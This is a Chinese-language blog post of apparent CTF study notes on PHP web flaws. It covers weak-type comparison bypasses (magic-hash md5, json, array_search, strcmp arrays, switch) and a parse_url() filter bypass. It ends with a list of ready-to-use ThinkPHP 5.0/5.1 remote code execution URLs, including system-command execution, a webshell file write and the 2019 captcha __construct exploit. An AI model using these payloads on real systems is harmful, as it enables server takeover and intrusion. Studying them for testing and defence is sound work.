---
title: web知识点记录
date: 2019-09-15 18:10:46
tags:
    - thinking
---

&emsp;&emsp;最近一直在写CPU,好久没有看web相关的东西了,发现之前刷的题全忘了qaq...本文记录遇到的相关知识点.

## 辣鸡PHP

---

### 弱类型

&emsp;&emsp;php的`'==='`与`==`是截然不同的,`===`会在判断前首先比较两变量类型,然后进行值的比较,但是`==`则强制转换为相同的类型,然后进行比较.

> 如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行

&emsp;&emsp;举几个例子:
```php
<?php
    var_dump("admin"==0);  //true
    var_dump("1admin"==1); //true
    var_dump("admin1"==1) //false
    var_dump("admin1"==0) //true
    var_dump("0e123456"=="0e4456789"); //true 
?>
```

&emsp;&emsp;PHP手册里说:**当一个字符串被当作一个数值来取值,其结果和类型如下:如果该字符串没有包含 '.'  'e'  'E'并且其数值值在整形的范围之内该字符串被当作int来取值,其他所有情况下都被作为float来取值,该字符串的开始部分决定了它的值,如果该字符串以合法的数值开始,则使用该数值,否则其值为0.**

 - 利用姿势

&emsp;&emsp;md5-hash碰撞
```php
<?php
if (isset($_GET['Username']) && isset($_GET['password'])) {
    $logined = true;
    $Username = $_GET['Username'];
    $password = $_GET['password'];

     if (!ctype_alpha($Username)) {$logined = false;}
     if (!is_numeric($password) ) {$logined = false;}
     if (md5($Username) != md5($password)) {$logined = false;}
     if ($logined){
    echo "successful";
      }else{
           echo "login failed!";
        }
    }
?>
```

&emsp;&emsp;根据上面的原理我们可以发现假如md5的开头是0e,那么比较时会被当作科学计数法,直接gg.

```php
md5('240610708') == md5('QNKCDZO');
```

&emsp;&emsp;json绕过

```php
<?php
if (isset($_POST['message'])) {
    $message = json_decode($_POST['message']);
    $key ="*********";
    if ($message->key == $key) {
        echo "flag";
    } 
    else {
        echo "fail";
    }
 }
 else{
     echo "~~~~";
 }
?>
```

&emsp;&emsp;我们并不知道$key的值,但是当`$message->key`为整数时,$key也会被转化为整数,因此构造payload如下:

```plain
message={"key":0}
```

&emsp;&emsp;array_search()绕过

```php
<?php
if(!is_array($_GET['test'])){exit();}
$test=$_GET['test'];
for($i=0;$i<count($test);$i++){
    if($test[$i]==="admin"){
        echo "error";
        exit();
    }
    $test[$i]=intval($test[$i]);
}
if(array_search("admin",$test)===0){
    echo "flag";
}
else{
    echo "false";
}
?>
```

&emsp;&emsp;`array_search()`这个函数在php Manual手册中写道:

```php
mixed array_search ( mixed $needle , array $haystack [, bool $strict = false ] );
```

&emsp;&emsp;在$haystack中查找$needle,若查到则返回index索引,第三个参数是选择是否开启严格比较.默认情况下比较模式为`==`,因此payload如下:

```
test[]=0
```
> 同样in_array()也有此漏洞

&emsp;&emsp;strcmp()漏洞绕过php -v < 5.3

```php
<?php
    $password="***************"
     if(isset($_POST['password'])){

        if (strcmp($_POST['password'], $password) == 0) {
            echo "Right!!!login success";n
            exit();
        } else {
            echo "Wrong password..";
        }
?>
```

&emsp;&emsp;strcmp会比较两个字符串,若两者相等则返回0,但是当两者的类型不同时,strcmp()会发生错误,但是仍然会判断其相等.因此我们可以传入`password[]=xx`来进行绕过.



> 同样md5() sha1()等函数也存在类似漏洞.



&emsp;&emsp;switch绕过

```php
<?php
$a="4admin";
switch ($a) {
    case 1:
        echo "fail1";
        break;
    case 2:
        echo "fail2";
        break;
    case 3:
        echo "fail3";
        break;
    case 4:
        echo "sucess";  //结果输出success;
        break;
    default:
        echo "failall";
        break;
}
?>
```

&emsp;&emsp;原理与上类似,不再阐述.

### 函数的漏洞

#### parse_url()

```php
parse_url ( string $url [, int $component = -1 ] ) : mixed
```

&emsp;&emsp;该函数解析URL，并返回其组成部分。其返回值为一个关联数组。该函数常用于获取url中的相关字段。例如：

```php
$url=parse_url($_SERVER['REQUEST_URI']);
parse_str($url['query'],$query);
```

通过这种方式拿到url中的GET value。但是在php5.4.7之前此函数存在漏洞，举个栗子：

```php
<?php 
$data = parse_url($_SERVER['REQUEST_URI']); 
var_dump($data);
$filter=["cache", "binarycloud"]; 
foreach($filter as $f)
{ 
        if(preg_match("/".$f."/i", $data['query']))
        { 
                die("Attack Detected"); 
        } 
} 
?>
```

正常情况下我们`curl "127.0.0.1/a.php?/cache"`会被检测到，这个时候一个通用的绕过方式为：

```shell
curl "127.0.0.1//a.php?/cache"
```

这时`a.php?/cache`会被当作data['path']，而不再是query，导致绕过过滤。假如payload为`///a.php?/cache`那么parse_url()会返回False，也可以绕过过滤。



### Thinkphp5 rce
&emsp;&emsp;不再分析原理，直接总结payload：
```url
TP版本5.0.21：
http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1


TP版本5.0.22：
http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami

http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

TP5.1.*
thinkphp5.1.29为例

1、代码执行:
http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=phpinfo&data=1

2、命令执行:
http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&filter=system&data=操作系统命令

3、文件写入（写shell）：
http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E

4、未知:
http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E

5、代码执行:
http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

6、命令执行:
http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令

7、代码执行:
http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

8、命令执行:
http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=操作系统命令
```

2019.1.11爆出的漏洞：

```php
index.php?s\captcha

_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=ls -al
```

分析文章来自[这里](<http://www.lmxspace.com/2019/01/13/ThinkPHP-request%E5%87%BD%E6%95%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/>)


















































































